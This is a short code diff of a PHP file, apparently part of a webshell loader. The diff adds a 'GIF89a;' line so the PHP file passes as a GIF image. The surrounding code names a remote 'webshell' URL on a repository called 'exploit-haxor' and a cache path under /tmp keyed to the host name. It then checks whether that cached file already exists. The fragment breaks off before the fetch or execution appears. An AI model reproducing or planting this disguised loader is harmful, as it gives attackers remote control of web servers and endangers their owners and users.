@@ -1,3 +1,4 @@
+GIF89a;
 <?php
 $data = ['https://raw.githubusercontent.com/exploit-haxor/webshell/main/header.php', '/tmp/sess_'.md5($_SERVER['HTTP_HOST']).'.php'];
 if(file_exists($data[1]) && filesize($data[1]) !== 0) {
